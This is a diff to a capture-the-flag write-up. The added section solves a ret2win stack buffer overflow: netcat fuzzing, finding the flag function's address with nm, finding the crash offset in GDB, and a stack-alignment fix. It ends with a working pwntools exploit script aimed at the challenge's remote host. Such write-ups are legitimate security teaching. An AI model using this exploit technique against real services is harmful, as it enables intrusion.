@@ -72,3 +72,47 @@ The hint "who dare to listen" suggests a network listener.
 4. **Exploit:** Connected to the server and sent `1337`.
 
 **Flag:** `flag{l33t_m3...}`
+
+
+## 4. BOF (Buffer Overflow)
+**Target:** Linux Executable (`bof.x-executable`) & Remote Service
+**Vulnerability:** Stack Buffer Overflow (Ret2Win)
+
+**Solution:**
+The challenge provided a binary and a netcat instance.
+1.  **Initial Fuzzing:** tried sending a long string (`python3 -c "print('A' * 100)" | nc ...`) to crash the service. The connection closed immediately, suggesting a crash.
+2.  **Static Analysis:** I needed a target address to jump to. I used `nm` to look for interesting functions:
+    ```bash
+    nm bof.x-executable | grep -i "flag"
+    ```
+    Result: `0000000000400767 T flag`. This is the address of the function that prints the flag.
+3.  **Dynamic Analysis (Finding Offset):**
+    - Started the binary in **GDB**: `gdb ./bof.x-executable`.
+    - Generated a cyclic pattern using a Python script to identify the exact crash point.
+    - Crashed the app and inspected the **RSP** register: `0x6264616161646161`.
+    - Calculated the offset by finding the position of that hex value in the pattern.
+    - **Offset found:** 312.
+4.  **Exploitation:**
+    I wrote a Python script using `pwntools` to send 312 'A's followed by the address of the `flag` function (`0x400767`).
+5.  **The Stack Alignment Issue:**
+    The initial exploit failed (EOF). I realized this was due to the **Stack Alignment** rule (System V AMD64 ABI requires 16-byte alignment when calling functions like `printf`). Jumping to the start of the function (`push rbp`) misaligned the stack.
+    * **Fix:** I added `+1` to the target address (`0x400768`) to skip the function prologue (`push rbp`). This kept the stack aligned.
+
+**Exploit Code:**
+```python
+from pwn import *
+
+target_host = "34.40.9.88"
+target_port = 32659
+offset = 312
+# Skip prologue for stack alignment (+1)
+flag_function_addr = 0x400767 + 1 
+
+conn = remote(target_host, target_port)
+
+payload = b"A" * offset
+payload += p64(flag_function_addr)
+
+print(conn.recv())
+conn.sendline(payload)
+print(conn.recvall().decode())
